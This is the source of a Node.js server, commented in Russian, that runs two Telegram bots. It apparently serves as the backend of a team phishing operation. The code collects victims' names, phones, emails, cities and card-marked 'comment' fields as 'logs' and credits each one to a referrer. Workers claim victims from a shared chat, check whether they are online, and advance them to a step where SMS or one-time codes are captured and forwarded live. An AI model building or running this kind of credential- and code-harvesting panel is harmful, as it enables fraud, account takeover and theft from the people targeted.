const express = require("express");
const TelegramBot = require("node-telegram-bot-api");

const app = express();

app.use(express.json({ limit: "1mb" }));
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

// ===== БОТ =====
const workerBot = new TelegramBot(process.env.WORKER_BOT_TOKEN, {
  polling: true
});

const enterBot = new TelegramBot(process.env.ENTER_BOT_TOKEN); // БЕЗ polling

// ===== ENV =====
const adminId = Number(process.env.ADMIN_CHAT_ID);
const workerChat = Number(process.env.WORKER_CHAT_ID);

// ===== БАЗЫ =====
let takenRequests = {};
let fullRequests = {};
let shortRequests = {};
let seenUsers = {};
let onlineUsers = {};
let bannedUsers = {};
let userStatus = {};
let requestOwner = {}; // 🔥 кто привёл

// ===== ONLINE =====
function isOnline(id) {
  if (!onlineUsers[id]) return false;
  return Date.now() - onlineUsers[id] < 20000;
}

// ===== ВХОД =====
app.post("/enter", (req, res) => {
  const id = req.body.clientId;
  if (!id) return res.json({ ok: false });

  onlineUsers[id] = Date.now();

  enterBot.sendMessage(adminId, `👀Переход по ссылке!\n🆔 ${id}`).catch(()=>{});

  res.json({ ok: true });
});

// ===== ПИНГ =====
app.post("/ping", (req, res) => {
  const id = req.body.clientId;
  if (id) onlineUsers[id] = Date.now();
  res.json({ ok: true });
});

// ===== ЗАЯВКА =====
app.post("/send", (req, res) => {
  try {
    const d = req.body;
    const id = d.clientId;

    if (!id) return res.json({ ok: false });
    if (bannedUsers[id]) return res.json({ ok: false });

    const isRepeat = seenUsers[id];
    seenUsers[id] = true;

    const statusText = isRepeat ? "Повторный Лог♻️" : "🔥 Новый Лог 👻";

    const moderator = d.refUser || "неизвестно";

    const fullText = `${statusText} Лог

🆔 ${id}

🏧 ${d.service}
🗝️ ${d.name}
📱 ${d.phone}
📆 ${d.email}
⛓️‍💥 ${d.city}
💳 ${d.comment}

: ${moderator}`;

    const shortText = `${statusText}

📦 ${d.service}
📱 ${d.phone}

 ${moderator}`;

    fullRequests[id] = fullText;
    shortRequests[id] = shortText;
    requestOwner[id] = moderator;

    workerBot.sendMessage(workerChat, shortText, {
      reply_markup: {
        inline_keyboard: [
          [{ text: "📥 Забрать", callback_data: "take_" + id }]
        ]
      }
    }).catch(()=>{});

    res.json({ ok: true });

  } catch (e) {
    res.json({ ok: false });
  }
});

// ===== СТАТУС =====
app.get("/status/:id", (req, res) => {
  res.json({ status: userStatus[req.params.id] || "wait" });
});

// ===== ДОП ДАННЫЕ =====
app.post("/send2", (req, res) => {
  try {
    const id = req.body.id;
    const value = req.body.value;

    if (!id || !value) return res.json({ ok: false });

    const owner = takenRequests[id];

    if (!owner) return res.json({ ok: true });

    workerBot.sendMessage(owner, `📩 SMS/CODE\n\n${value}`).catch(()=>{});

    res.json({ ok: true });

  } catch {
    res.json({ ok: false });
  }
});

// ===== CALLBACK =====
workerBot.on("callback_query", async (q) => {
  try {
    const data = q.data;
    const id = data.split("_")[1];

    // ===== ЗАБРАТЬ =====
    if (data.startsWith("take")) {

      if (takenRequests[id]) {
        return workerBot.answerCallbackQuery(q.id, {
          text: "❌ Уже занято"
        });
      }

      takenRequests[id] = q.from.id;

      const username = q.from.username
        ? "@" + q.from.username
        : q.from.first_name;

      // меняем сообщение в чате
      await workerBot.editMessageText(
        shortRequests[id] + `\n\n Взял: ${username}`,
        {
          chat_id: q.message.chat.id,
          message_id: q.message.message_id,
          reply_markup: {
            inline_keyboard: [
              [{ text: "🔓 Отпустить", callback_data: "release_" + id }]
            ]
          }
        }
      );

      // отправляем в личку
      workerBot.sendMessage(q.from.id, fullRequests[id], {
        reply_markup: {
          inline_keyboard: [
            [{ text: "🟢 Онлайн?", callback_data: "check_" + id }],
            [
              { text: "🚫 Бан", callback_data: "ban_" + id },
              { text: "✅ Разбан", callback_data: "unban_" + id }
            ],
            [{ text: "➡️ SMS/CODE", callback_data: "allow_" + id }]
          ]
        }
      }).catch(()=>{});

      workerBot.answerCallbackQuery(q.id);
    }

    // ===== ОТПУСТИТЬ =====
    if (data.startsWith("release")) {

      if (takenRequests[id] !== q.from.id) {
        return workerBot.answerCallbackQuery(q.id, {
          text: "❌ Не твой"
        });
      }

      delete takenRequests[id];

      await workerBot.editMessageText(
        shortRequests[id],
        {
          chat_id: q.message.chat.id,
          message_id: q.message.message_id,
          reply_markup: {
            inline_keyboard: [
              [{ text: "📥 Забрать", callback_data: "take_" + id }]
            ]
          }
        }
      );

      workerBot.answerCallbackQuery(q.id, {
        text: "✅ Освобождено"
      });
    }

    // ===== ОНЛАЙН =====
    if (data.startsWith("check")) {
      workerBot.answerCallbackQuery(q.id, {
        text: isOnline(id) ? "🟢 Онлайн" : "🔴 Оффлайн"
      });
    }

    // ===== БАН =====
    if (data.startsWith("ban")) {
      bannedUsers[id] = true;
      workerBot.answerCallbackQuery(q.id);
    }

    // ===== РАЗБАН =====
    if (data.startsWith("unban")) {
      delete bannedUsers[id];
      workerBot.answerCallbackQuery(q.id);
    }

    // ===== ДАЛЬШЕ =====
    if (data.startsWith("allow")) {
      userStatus[id] = "next";
      workerBot.answerCallbackQuery(q.id, {
        text: "➡️ SMS/CODE"
      });
    }

  } catch (e) {
    console.log("ERR:", e.message);
  }
});

// ===== АНТИКРАШ =====
process.on("uncaughtException", (e) => console.log("CRASH:", e));
process.on("unhandledRejection", (e) => console.log("REJECT:", e));

// ===== СТАРТ =====
app.listen(process.env.PORT || 3000, () => {
  console.log("SERVER OK");
});
